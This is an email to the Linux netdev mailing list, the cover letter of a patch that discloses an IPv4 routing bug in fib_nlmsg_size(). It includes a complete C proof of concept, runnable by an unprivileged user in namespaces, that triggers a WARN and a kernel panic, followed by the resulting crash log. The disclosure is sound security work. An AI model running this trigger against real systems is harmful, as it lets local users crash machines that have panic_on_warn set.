Received: from mail-pj2-f0.google.com (mail-pj2-f0.google.com [74.125.227.128])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 055DA422521
	for <netdev@vger.kernel.org>; Thu, 30 Jul 2026 12:59:59 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.128
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785416402; cv=none; b=PckZfLSzbd/cDR32hZ+Dgs2UBGL6Ko0TsKQZyP0jaN3X/7kYIgBdmlwmPtOo/EUont54W7SaN7+orJSKbKsaEa3uDMaZrlIxjtwHYrZz7BiTNMRshhJo4CQp5W8f/yQFNphqM+YIVzlEwl19a8h++RbiRET5fFTBGEq+45hB1ik=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785416402; c=relaxed/simple;
	bh=GF/MMkJHnVSKrJq1ii8jI5QHwTco7QFhzdcxPxFbl5U=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=eu4KQXfC6xxnf3yAnTl+8msxwi61nsEkWj/BLpcA4gvpe+YFUH1uXoUWLH1mcxQt9W0GIR1A7bdaST7t7gr5Oje14ELpc2AEkxWPFlnksylfXzJDfuk2xzUNPG3NG3QM+9Qz8747FRVtkuu900EHD4nKwz50+8I/sGtu67D8kxY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=XEbI2smy; arc=none smtp.client-ip=74.125.227.128
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="XEbI2smy"
Received: by mail-pj2-f0.google.com with SMTP id 98e67ed59e1d1-380f4166f80so1562490a91.1
        for <netdev@vger.kernel.org>; Thu, 30 Jul 2026 05:59:59 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785416399; x=1786021199; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=rO+mUoUedWPheu3xG2xCn1ARMxS6IH5ljHNZujdmYK0=;
        b=XEbI2smyWB1eAj/rc8b3Yuygahxw1QKMs5L+992jHF7PwuhZnu7yxv0c7rjvzUDf07
         vuMXSUsCH0yyB0wSFoPmBrNekPlCnMhiPmDqsfzUXZXVUb3HrpJbcLJBleCF7mfvhtOD
         sCJeFQlRehmRDs+3TcoOtVnLSE1B68cQ2K7YH6zM/JrEbXE/q02HMI/PMeslMJcEB3gc
         IoDt5UdAc95gKfrn0T9c2Po8SkaJneggxNS/8PBo24FmyyY2R94JXOzSLz5ky24kERfD
         5Zg4R3+jWC4ykQiUYf/jHY0YzVTlP4gUKTAvvJad78MHAJDJvLhKEwSS36IN7MfPEi1X
         6a2g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785416399; x=1786021199;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=rO+mUoUedWPheu3xG2xCn1ARMxS6IH5ljHNZujdmYK0=;
        b=VGDWnuQcbY0Pw5BmEJkqsejiUOabSaXWhF1TU9mJO191kUJ6XtkOXZrIitPFVuq85S
         846HIC2Q3R2N/ndx4q7R3+9b73zIQ+/YdfRwt5NxH/77M9G3gLxsta210l4QBm8HkDfK
         DevBtau97o+Hmzk3pSi7wTHhCsdFy4T1Qk3348aWjhjxyefOk8SBDIMtGOM4IPQrT7tL
         Swlur84RKv7RHJYJNeJgfoDS6Aff/PLiZlzm6cCugZ2svEfxhDjV+5eIrAGdWWBqAU57
         ghYvZ8PojdzxP7sjce/jckzKvQjJF7csk7SoAF3YHyTMVE8Hyd0iGR6OHvXk6pJVxCzi
         mpfA==
X-Gm-Message-State: AOJu0YzzX6QDA+zedZDwQznUZfgUZR/CSW8N6udGPSK40nnd7b8ozyXo
	XfZSE2qTrHRmgpYD3re/LB2oSGyc18m7rkzzN3cf5jwQbWkV8e0DuLUicr3taGeswAtzrEQ95+z
	kNqGRpw5ZX6Y=
X-Gm-Gg: AR+sD12IGGu/8iHburPAU7g7xtESAkxZHOXsi1E6AW0pe5yLpww/ozoZxnbl+F6W6Hh
	6RgdOmLFjxMBON2G8b9ooi1muTTMpeQlY7pd1tGeCpGZomO8Jb81yjlEw0iWDOD4ViV1Gi6joHP
	UhU7qQl1fTH8qrxjXYPpSPo/V+VG7IbZmYdT0OFTo6Ald9hCQuTwojgpJ8NZbpJotEJOeLf9O8P
	RTrar451blA6cZDdCivUCArfL41xffYzeHQew8L84XtFX0y4rFyU+2ulV5afrM7/QYgIIm5gqmd
	tePzwiXBwtUtBXnMfmq3Ie4DT9iuuPY7qwSrYEcIp7SUFp0q7UOAnHGGDLCKXtCQ7bEJ6xNB49G
	mFOP536Bupazsi3Jm3T8mRJrpD18fS1fDBG7aUaZO9DA7M2aID6wlCzE/ZbUZ45sfAs3aP4noP9
	4VZRSrliORYy6P+mBSlrTSmGCSuY9QdT7KKTSMKkFDVT9CilpfZI6rVejYO/vNOzlVI/NQ0hprz
	XM/Bmqydg==
X-Received: by 2002:a17:90b:4e8f:b0:387:e0db:3fad with SMTP id 98e67ed59e1d1-38f9c08798dmr2288875a91.38.1785416398879;
        Thu, 30 Jul 2026 05:59:58 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38f9b95ec97sm1019301a91.5.2026.07.30.05.59.55
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 30 Jul 2026 05:59:58 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v2 0/1] ipv4: Fix fib_nlmsg_size() for RTA_VIA nexthops
Date: Thu, 30 Jul 2026 12:59:25 +0000
Message-ID: <cover.1785411219.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv4/fib_semantics.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

fib_nlmsg_size() allocates the skb used by IPv4 route notifications before
fib_dump_info() serializes the route. The old size calculation did not match
the actual nexthop attributes emitted for IPv4 routes with IPv6 gateways.

When an IPv4 route uses an IPv6 gateway, fib_nexthop_info() emits the gateway
as RTA_VIA, but fib_nlmsg_size() only charged a 4-byte RTA_GATEWAY-style
attribute. For multipath routes it also charged each struct rtnexthop as if it
were wrapped by its own nlattr, even though fib_add_nexthop() emits it with
nla_reserve_nohdr(), and it charged RTA_FLOW even when it was absent. With
enough IPv6-via nexthops, fib_dump_info() returns -EMSGSIZE and rtmsg_fib()
hits WARN_ON(err == -EMSGSIZE). In a panic_on_warn kernel this panics the
machine.

The fix mirrors the actual dump layout in fib_nlmsg_size(): IPv6 nexthop
gateways are charged as RTA_VIA, multipath rtnexthop headers are charged with
the same alignment used by nla_reserve_nohdr(), and RTA_FLOW is only charged
when it is actually present.

The root cause was introduced by commit d15662682db2 ("ipv4: Allow ipv6
gateway with ipv4 routes"), which first made IPv4 route notifications dump
IPv6 gateways via RTA_VIA and therefore made the current undercount possible.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

The validated run used the preserved wrapper script below with:

    MODE=ns COUNT=48 ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define DEST_PREFIX "198.51.100.0"
#define PREFSRC_ADDR "192.0.2.254"
#define VIA_PREFIX "2001:db8::"
#define ROUTE_METRIC 123U
#define BUF_SIZE 65536

struct req {
	struct nlmsghdr nlh;
	struct rtmsg rtm;
	char buf[BUF_SIZE];
};

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void *buf_nlmsg_tail(void *buf, const struct nlmsghdr *nlh)
{
	return (void *)((char *)buf + NLMSG_ALIGN(nlh->nlmsg_len));
}

static int nlmsg_addattr(void *buf, struct nlmsghdr *nlh, size_t maxlen,
			 uint16_t type,
			 const void *data, size_t len)
{
	size_t attr_len = RTA_LENGTH(len);
	size_t total = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(attr_len);
	struct rtattr *rta;

	if (total > maxlen)
		return -1;

	rta = buf_nlmsg_tail(buf, nlh);
	rta->rta_type = type;
	rta->rta_len = attr_len;
	if (len && data)
		memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = total;
	return 0;
}

static struct rtattr *nlmsg_nest_start(void *buf, struct nlmsghdr *nlh,
				       size_t maxlen, uint16_t type)
{
	struct rtattr *nest = buf_nlmsg_tail(buf, nlh);

	if (nlmsg_addattr(buf, nlh, maxlen, type, NULL, 0) < 0)
		return NULL;
	return nest;
}

static void nlmsg_nest_end(void *buf, struct nlmsghdr *nlh, struct rtattr *nest)
{
	nest->rta_len = (char *)buf_nlmsg_tail(buf, nlh) - (char *)nest;
}

static int rtnh_addattr(void *buf, struct nlmsghdr *nlh, size_t maxlen,
			struct rtnexthop *rtnh, uint16_t type,
			const void *data, size_t len)
{
	size_t attr_len = RTA_LENGTH(len);
	size_t total = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(attr_len);
	struct rtattr *rta;

	if (total > maxlen)
		return -1;

	rta = buf_nlmsg_tail(buf, nlh);
	rta->rta_type = type;
	rta->rta_len = attr_len;
	if (len && data)
		memcpy(RTA_DATA(rta), data, len);

	nlh->nlmsg_len = total;
	rtnh->rtnh_len += RTA_ALIGN(attr_len);
	return 0;
}

static int add_metric(void *buf, struct rtattr **metrics, struct nlmsghdr *nlh,
		      size_t maxlen, uint16_t type, const void *data, size_t len)
{
	if (!*metrics) {
		*metrics = nlmsg_nest_start(buf, nlh, maxlen, RTA_METRICS);
		if (!*metrics)
			return -1;
	}

	return nlmsg_addattr(buf, nlh, maxlen, type, data, len);
}

static int add_metrics(void *buf, struct nlmsghdr *nlh, size_t maxlen)
{
	struct rtattr *metrics = NULL;
	uint32_t one = 1;
	uint32_t mtu = 1400;
	uint32_t advmss = 1200;
	uint32_t cwnd = 10;
	uint32_t features = 1;
	const char cc_algo[] = "reno";

	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_LOCK, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_MTU, &mtu, sizeof(mtu)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_WINDOW, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_RTT, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_RTTVAR, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_SSTHRESH, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_CWND, &cwnd, sizeof(cwnd)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_ADVMSS, &advmss, sizeof(advmss)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_REORDERING, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_HOPLIMIT, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_INITCWND, &cwnd, sizeof(cwnd)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_FEATURES, &features, sizeof(features)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_RTO_MIN, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_INITRWND, &cwnd, sizeof(cwnd)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_QUICKACK, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_CC_ALGO, cc_algo, sizeof(cc_algo)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_FASTOPEN_NO_COOKIE, &one,
		       sizeof(one)) < 0)
		return -1;

	if (metrics)
		nlmsg_nest_end(buf, nlh, metrics);
	return 0;
}

static int build_route(struct req *req, size_t maxlen, unsigned int nh_count,
		       int ifindex, bool with_flow)
{
	struct in_addr dst;
	struct in_addr prefsrc;
	uint32_t table = RT_TABLE_MAIN;
	uint32_t priority = ROUTE_METRIC;
	struct rtattr *multipath;
	unsigned int i;

	memset(req, 0, sizeof(*req));

	req->nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req->rtm));
	req->nlh.nlmsg_type = RTM_NEWROUTE;
	req->nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	req->nlh.nlmsg_seq = 1;

	req->rtm.rtm_family = AF_INET;
	req->rtm.rtm_dst_len = 24;
	req->rtm.rtm_table = RT_TABLE_MAIN;
	req->rtm.rtm_protocol = RTPROT_BOOT;
	req->rtm.rtm_scope = RT_SCOPE_UNIVERSE;
	req->rtm.rtm_type = RTN_UNICAST;

	if (inet_pton(AF_INET, DEST_PREFIX, &dst) != 1) {
		errno = EINVAL;
		return -1;
	}
	if (inet_pton(AF_INET, PREFSRC_ADDR, &prefsrc) != 1) {
		errno = EINVAL;
		return -1;
	}

	if (nlmsg_addattr(req, &req->nlh, maxlen, RTA_TABLE, &table, sizeof(table)) < 0)
		return -1;
	if (nlmsg_addattr(req, &req->nlh, maxlen, RTA_DST, &dst, sizeof(dst)) < 0)
		return -1;
	if (nlmsg_addattr(req, &req->nlh, maxlen, RTA_PRIORITY, &priority,
			  sizeof(priority)) < 0)
		return -1;
	if (nlmsg_addattr(req, &req->nlh, maxlen, RTA_PREFSRC, &prefsrc,
			  sizeof(prefsrc)) < 0)
		return -1;
	if (add_metrics(req, &req->nlh, maxlen) < 0)
		return -1;

	multipath = nlmsg_nest_start(req, &req->nlh, maxlen, RTA_MULTIPATH);
	if (!multipath)
		return -1;

	for (i = 1; i <= nh_count; i++) {
		struct rtnexthop *rtnh;
		struct in6_addr gw6;
		char addrbuf[sizeof("2001:db8::") + 10];
		unsigned char via[2 + sizeof(gw6)];

		if ((size_t)((char *)buf_nlmsg_tail(req, &req->nlh) - (char *)req) +
		    NLMSG_ALIGN(sizeof(*rtnh)) > maxlen) {
			errno = ENOSPC;
			return -1;
		}

		rtnh = buf_nlmsg_tail(req, &req->nlh);
		memset(rtnh, 0, sizeof(*rtnh));
		rtnh->rtnh_len = sizeof(*rtnh);
		rtnh->rtnh_flags = RTNH_F_ONLINK;
		rtnh->rtnh_hops = 0;
		rtnh->rtnh_ifindex = ifindex;
		req->nlh.nlmsg_len = NLMSG_ALIGN(req->nlh.nlmsg_len) +
				     NLMSG_ALIGN(sizeof(*rtnh));

		snprintf(addrbuf, sizeof(addrbuf), VIA_PREFIX "%x", i);
		if (inet_pton(AF_INET6, addrbuf, &gw6) != 1) {
			errno = EINVAL;
			return -1;
		}

		memset(via, 0, sizeof(via));
		via[0] = AF_INET6 & 0xff;
		via[1] = (AF_INET6 >> 8) & 0xff;
		memcpy(via + 2, &gw6, sizeof(gw6));

		if (rtnh_addattr(req, &req->nlh, maxlen, rtnh, RTA_VIA, via,
				 sizeof(via)) < 0)
			return -1;

		if (with_flow) {
			uint32_t flow = i;

			if (rtnh_addattr(req, &req->nlh, maxlen, rtnh, RTA_FLOW, &flow,
					 sizeof(flow)) < 0)
				return -1;
		}
	}

	nlmsg_nest_end(req, &req->nlh, multipath);
	return 0;
}

static int send_netlink_req(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl nladdr = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	char ackbuf[8192];
	struct iovec ack_iov = {
		.iov_base = ackbuf,
		.iov_len = sizeof(ackbuf),
	};
	struct msghdr ack_msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &ack_iov,
		.msg_iovlen = 1,
	};
	struct nlmsghdr *h;
	ssize_t len;

	if (sendmsg(fd, &msg, 0) < 0)
		return -1;

	len = recvmsg(fd, &ack_msg, 0);
	if (len < 0)
		return -1;

	for (h = (struct nlmsghdr *)ackbuf; NLMSG_OK(h, (unsigned int)len);
	     h = NLMSG_NEXT(h, len)) {
		if (h->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *err = NLMSG_DATA(h);

			if (err->error) {
				errno = -err->error;
				return -1;
			}
			return 0;
		}
	}

	errno = EPROTO;
	return -1;
}

static int delete_route(int fd)
{
	struct {
		struct nlmsghdr nlh;
		struct rtmsg rtm;
		char buf[128];
	} req = {
		.nlh = {
			.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)),
			.nlmsg_type = RTM_DELROUTE,
			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
			.nlmsg_seq = 2,
		},
		.rtm = {
			.rtm_family = AF_INET,
			.rtm_dst_len = 24,
			.rtm_table = RT_TABLE_MAIN,
			.rtm_protocol = RTPROT_BOOT,
			.rtm_scope = RT_SCOPE_UNIVERSE,
			.rtm_type = RTN_UNICAST,
		},
	};
	struct in_addr dst;
	uint32_t table = RT_TABLE_MAIN;

	if (inet_pton(AF_INET, DEST_PREFIX, &dst) != 1)
		return -1;
	if (nlmsg_addattr(&req, &req.nlh, sizeof(req), RTA_TABLE, &table, sizeof(table)) < 0)
		return -1;
	if (nlmsg_addattr(&req, &req.nlh, sizeof(req), RTA_DST, &dst, sizeof(dst)) < 0)
		return -1;

	if (send_netlink_req(fd, &req.nlh) < 0) {
		if (errno == ESRCH)
			return 0;
		return -1;
	}

	return 0;
}

int main(int argc, char **argv)
{
	struct req *req;
	unsigned int nh_count = 128;
	const char *ifname = "dummy0";
	bool with_flow = true;
	int ifindex;
	int fd;

	if (argc > 1)
		nh_count = strtoul(argv[1], NULL, 0);
	if (argc > 2)
		ifname = argv[2];
	if (argc > 3)
		with_flow = strcmp(argv[3], "noflow") != 0;

	ifindex = if_nametoindex(ifname);
	if (!ifindex) {
		fprintf(stderr, "interface %s not found\n", ifname);
		return EXIT_FAILURE;
	}

	req = calloc(1, sizeof(*req));
	if (!req)
		die("calloc");

	if (build_route(req, sizeof(*req), nh_count, ifindex, with_flow) < 0)
		die("build_route");

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die("socket");

	if (delete_route(fd) < 0)
		die("delete_route");

	if (send_netlink_req(fd, &req->nlh) < 0)
		die("send_netlink_req");

	printf("added route with %u nexthops on %s (%s flow attr)\n",
	       nh_count, ifname, with_flow ? "with" : "without");

	close(fd);
	free(req);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[   15.788149] ------------[ cut here ]------------
[   15.798564] WARNING: net/ipv4/fib_semantics.c:566 at rtmsg_fib+0x193/0x1a0, CPU#1: poc/259
[   15.819396] Modules linked in:
[   15.826740] CPU: 1 UID: 1001 PID: 259 Comm: poc Not tainted 7.2.0-rc4-00389-g53658c6f3682 #4 PREEMPT(lazy) 
[   15.847330] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   15.875102] RIP: 0010:rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
[   15.886524] Code: 74 01 75 2b 48 8b 7d 08 48 83 c4 30 89 da be 07 00 00 00 5b 5d 41 5c 41 5d 41 5e 41 5f e9 25 23 ee ff bb 97 ff ff ff eb cc 90 <0f> 0b 90 eb b7 e8 33 64 26 00 0f 1f 00 90 90 90 90 90 90 90 90 90
All code
========
   0:	74 01                	je     0x3
   2:	75 2b                	jne    0x2f
   4:	48 8b 7d 08          	mov    0x8(%rbp),%rdi
   8:	48 83 c4 30          	add    $0x30,%rsp
   c:	89 da                	mov    %ebx,%edx
   e:	be 07 00 00 00       	mov    $0x7,%esi
  13:	5b                   	pop    %rbx
  14:	5d                   	pop    %rbp
  15:	41 5c                	pop    %r12
  17:	41 5d                	pop    %r13
  19:	41 5e                	pop    %r14
  1b:	41 5f                	pop    %r15
  1d:	e9 25 23 ee ff       	jmp    0xffffffffffee2347
  22:	bb 97 ff ff ff       	mov    $0xffffff97,%ebx
  27:	eb cc                	jmp    0xfffffffffffffff5
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	90                   	nop
  2d:	eb b7                	jmp    0xffffffffffffffe6
  2f:	e8 33 64 26 00       	call   0x266467
  34:	0f 1f 00             	nopl   (%rax)
  37:	90                   	nop
  38:	90                   	nop
  39:	90                   	nop
  3a:	90                   	nop
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	90                   	nop
   3:	eb b7                	jmp    0xffffffffffffffbc
   5:	e8 33 64 26 00       	call   0x26643d
   a:	0f 1f 00             	nopl   (%rax)
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[   15.929053] RSP: 0018:ffff97d00034b8a0 EFLAGS: 00010246
[   15.940737] RAX: 00000000ffffffa6 RBX: 00000000ffffffa6 RCX: ffff97d00034b7fb
[   15.956222] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff9523038c53c0
[   15.973048] RBP: ffff97d00034ba48 R08: 0000000000000001 R09: ffff95230cf03eb0
[   15.989402] R10: ffffffffaa44dde0 R11: fefefefefefefeff R12: 0000000000000018
[   16.004914] R13: 00000000006433c6 R14: 00000000000000fe R15: 0000000000000001
[   16.019329] FS:  00007fb9dd727540(0000) GS:ffff9523d2f6c000(0000) knlGS:0000000000000000
[   16.037578] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   16.050053] CR2: 00007ffd32666f40 CR3: 000000000b7d7001 CR4: 0000000000370ef0
[   16.064929] Call Trace:
[   16.070054]  <TASK>
[   16.074596]  fib_table_insert (net/ipv4/fib_trie.c:1380 (discriminator 1))
[   16.083900]  ? msi_set_affinity (arch/x86/kernel/apic/msi.c:37 (discriminator 1))
[   16.092900]  ? arch_stack_walk (arch/x86/kernel/stacktrace.c:26)
[   16.101235]  ? inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   16.110591]  inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   16.118640]  ? __pfx_inet_rtm_newroute (net/ipv4/fib_frontend.c:909)
[   16.128504]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7076)
[   16.136524]  ? __alloc_skb (net/core/skbuff.c:715)
[   16.144368]  ? ___slab_alloc (mm/slub.c:1080 mm/slub.c:4524)
[   16.156445]  ? avc_has_perm (include/linux/rcupdate.h:873 security/selinux/avc.c:1165 security/selinux/avc.c:1195)
[   16.165362]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4441)
[   16.178514]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[   16.186128]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[   16.194378]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[   16.202745]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))
[   16.210082]  ___sys_sendmsg (net/socket.c:2738)
[   16.219513]  __sys_sendmsg (net/socket.c:2770)
[   16.227224]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   16.235472]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   16.249707] RIP: 0033:0x7fb9dd64efa3
[   16.257622] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 64 8b 04 25 18 00 00 00 85 c0 75 14 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 55 c3 0f 1f 40 00 48 83 ec 28 89 54 24 1c 48
All code
========
   0:	64 89 02             	mov    %eax,%fs:(%rdx)
   3:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   a:	eb b7                	jmp    0xffffffffffffffc3
   c:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  13:	00 00 00 
  16:	90                   	nop
  17:	64 8b 04 25 18 00 00 	mov    %fs:0x18,%eax
  1e:	00 
  1f:	85 c0                	test   %eax,%eax
  21:	75 14                	jne    0x37
  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 55                	ja     0x87
  32:	c3                   	ret
  33:	0f 1f 40 00          	nopl   0x0(%rax)
  37:	48 83 ec 28          	sub    $0x28,%rsp
  3b:	89 54 24 1c          	mov    %edx,0x1c(%rsp)
  3f:	48                   	rex.W

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 55                	ja     0x5d
   8:	c3                   	ret
   9:	0f 1f 40 00          	nopl   0x0(%rax)
   d:	48 83 ec 28          	sub    $0x28,%rsp
  11:	89 54 24 1c          	mov    %edx,0x1c(%rsp)
  15:	48                   	rex.W
[   16.297484] RSP: 002b:00007ffd326672f8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   16.311567] RAX: ffffffffffffffda RBX: 00007ffd326673b0 RCX: 00007fb9dd64efa3
[   16.325962] RDX: 0000000000000000 RSI: 00007ffd32667330 RDI: 0000000000000003
[   16.337955] RBP: 0000000000000003 R08: 0000000000000008 R09: 0000000000000004
[   16.351264] R10: fffffffffffff61f R11: 0000000000000246 R12: 00005563c1d7c2a0
[   16.363193] R13: 00005563c1d7c2a0 R14: 00007ffd32669430 R15: 0000000000000003
[   16.374980]  </TASK>
[   16.378237] Kernel panic - not syncing: kernel: panic_on_warn set ...
[   16.389681] CPU: 1 UID: 1001 PID: 259 Comm: poc Not tainted 7.2.0-rc4-00389-g53658c6f3682 #4 PREEMPT(lazy) 
[   16.406656] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   16.425849] Call Trace:
[   16.429194]  <TASK>
[   16.432527]  vpanic (kernel/panic.c:651)
[   16.438646]  ? rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
[   16.444052]  panic (kernel/panic.c:788)
[   16.448363]  check_panic_on_warn (kernel/panic.c:525 kernel/panic.c:520)
[   16.455827]  __warn (kernel/panic.c:1104)
[   16.460334]  __report_bug (lib/bug.c:254)
[   16.466333]  ? rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
[   16.472272]  ? ___slab_alloc (mm/slub.c:1080 mm/slub.c:4524)
[   16.480720]  ? entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   16.490721]  ? rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
[   16.500083]  report_bug (lib/bug.c:286)
[   16.512584]  handle_bug (arch/x86/kernel/traps.c:436)
[   16.519464]  exc_invalid_op (arch/x86/kernel/traps.c:490 (discriminator 1))
[   16.526285]  asm_exc_invalid_op (arch/x86/include/asm/idtentry.h:593)
[   16.534036] RIP: 0010:rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
